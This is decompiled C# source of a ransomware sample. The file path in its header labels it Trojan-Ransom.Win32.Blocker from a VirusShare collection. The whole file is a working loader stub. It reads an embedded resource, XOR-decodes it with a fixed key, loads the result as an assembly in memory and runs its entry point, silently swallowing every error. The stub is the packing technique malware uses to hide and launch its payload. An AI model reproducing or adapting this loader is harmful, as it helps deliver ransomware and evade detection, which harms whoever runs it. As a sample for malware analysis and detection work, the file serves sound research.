// Decompiled with JetBrains decompiler
// Type: SalKom
// Assembly: PiL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BDEA68F-63DD-47EB-BCB7-0924CE9DFB5C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.fbrr-37e45b2af149731593dd0149c1e3917f9a467dd99af85c00cb1ef090d9d65d03.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

public class SalKom
{
  [STAThread]
  public static void Main()
  {
    try
    {
      new Thread(new ThreadStart(SalKom.SalKomNE))
      {
        IsBackground = true
      }.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      SalKom.SalKomRB(SalKom.SalKomBytes);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void SalKomRB(byte[] SalKomD)
  {
    try
    {
      Thread thread = new Thread(new ParameterizedThreadStart(SalKom.SalKomO));
      thread.SetApartmentState(ApartmentState.STA);
      thread.Start((object) SalKomD);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void SalKomO(object SalKomObj)
  {
    try
    {
      Assembly.Load((byte[]) SalKomObj).EntryPoint.Invoke((object) null, (object[]) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void SalKomNE()
  {
  }

  public static void SalKomNM()
  {
    try
    {
      Assembly.Load(SalKom.SalKomBytes).EntryPoint.Invoke((object) null, (object[]) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static byte[] SalKomBytes => Encoding.Default.GetBytes(SalKom.SalKomX(Encoding.Default.GetString(SalKom.SalKom4("_res32.resources")), 239));

  public static string SalKomX(string SalKomTTE, int SalKomK)
  {
    string str;
    try
    {
      StringBuilder stringBuilder1 = new StringBuilder(SalKomTTE);
      StringBuilder stringBuilder2 = new StringBuilder(SalKomTTE.Length);
      int num = checked (SalKomTTE.Length - 1);
      int index = 0;
      while (index <= num)
      {
        char ch = Strings.Chr(Strings.Asc(stringBuilder1[index]) ^ SalKomK);
        stringBuilder2.Append(ch);
        checked { ++index; }
      }
      str = stringBuilder2.ToString();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static object SalKomNothing => (object) null;

  public static byte[] SalKom4(string SalKom5)
  {
    byte[] numArray;
    try
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(SalKom5);
      byte[] buffer = new byte[checked ((int) (manifestResourceStream.Length - 1L) + 1)];
      int count = manifestResourceStream.Read(buffer, 0, checked ((int) manifestResourceStream.Length));
      numArray = new MemoryStream(buffer, 0, count).ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }
}
